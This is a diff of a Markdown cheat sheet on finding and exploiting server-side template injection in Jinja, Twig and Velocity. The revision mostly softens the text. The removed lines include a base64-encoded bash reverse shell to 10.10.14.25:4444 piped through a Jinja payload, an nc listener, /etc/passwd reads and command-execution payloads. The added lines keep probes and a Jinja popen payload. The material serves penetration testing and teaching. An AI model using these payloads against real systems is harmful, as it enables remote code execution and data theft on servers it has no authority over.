@@ -1,93 +1,100 @@
 ## Server-Side Template Injection
 
-### Most common payload for detection
-```
+Look for places where user input is rendered into:
+
+- email templates
+- PDF generation
+- notification previews
+- admin customization fields
+- error pages or template previews
+
+Strong hints:
+
+- expressions like `{{...}}`, `${...}`, or `<#...>`
+- input reflected after server-side rendering rather than raw output
+
+
+### Step 1: Basic Evaluation
+
+Simple probes:
+
+```text
+{{7*7}}
 ${7*7}
-```
-
-### Step 1: Basic evaluations
-
-```
-{{4*4}}
 {{7+3}}
 ```
 
-### Step 2: we can try to retrieve application classes or objects:
+If the output changes to a computed result, SSTI is likely.
 
-``` 
-{{ ”.__class__ }}
-{{ ”.__class__.__mro__ }}
+### Step 2: Fingerprint The Engine
+
+Examples:
+
+- Jinja often renders `{{ 7 * '7' }}` as repeated text
+- Twig tends to evaluate arithmetic differently
+- Java engines often use `${...}` or `#set(...)`
+
+This matters because payloads are engine-specific.
+
+### Step 3: Context Discovery
+
+If safe to do so, test whether objects or configuration are exposed.
+
+Jinja-style examples:
+
+```text
+{{ config }}
+{{ ''.__class__ }}
+{{ ''.__class__.__mro__ }}
 ```
 
-### Step 3: Look for files to read from the server:
+The goal is to understand the template context before attempting anything heavier.
 
-```
-{{ ‘/etc/passwd’ | read }}
-{{ ‘file:///etc/passwd’ | urlize }}
-```
+### Step 4: File Read Or Code Execution
 
-### Step 4: Execute system commands:
+Only after confirming the engine and context should you test higher-impact paths.
 
-```
-{{ ‘ls’ | shell_exec }}
-{{ ‘id’ | system }}
-```
+Examples that may work in specific engines:
 
-### Might need to convert bash shell to base64
-```
-echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
-# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS80NDQ0IDA+JjE=
-nc -lvvp 4444
+```text
+{{ __import__('os').popen('id').read() }}
+{{ dump() }}
 ```
 
-### Supplying SSTI payload via the vulnerable parameter
-```
-{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZG
-V2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}
-```
+These are not universal. Treat them as engine-specific escalation, not generic SSTI proof.
 
+### Common Engines
 
-### Jinja (python)
+#### Jinja
 
-#### Detection
-``` 
-{{ 7 * 7 }} 
-{{ 7 * '7' }} # 7777777 in Jinja2 
+Detection:
+
+```text
+{{ 7 * 7 }}
+{{ 7 * '7' }}
 {{ config }}
 ```
 
-#### RCE
-```
-__import__('os').system('ls')
-{{ __import__('os').popen('cat /etc/passwd').read() }}.
-```
+#### Twig
 
-### Twig (PHP)
+Detection:
 
-#### Detection
-```
+```text
 {{ 7 * 7 }}
-{{ 7 * '7' }} # returns 49 in Twig
 {{ dump() }}
 ```
-#### RCE
-```
-{{ dump(system('ls')) }}
-```
 
-### Velocity (Java): 
+#### Velocity
 
-#### Detection
-```
+Detection:
+
+```text
 #set($foo = "bar")
-#parse("exploit.vm").
 ```
 
-#### RCE
-```
-#set($ex = new java.lang.ProcessBuilder('ls').start())
-```
+### Pitfalls
 
-### SSTI Decision Tree 
-
-![SSTI Decision Tree ](SSTI-DecisionTree.png)
+- assuming reflected braces automatically mean SSTI
+- using engine-specific RCE payloads before fingerprinting the engine
+- overcommitting to command execution when configuration disclosure already proves impact
+- forgetting that some SSTI points exist only in admin or email-preview workflows
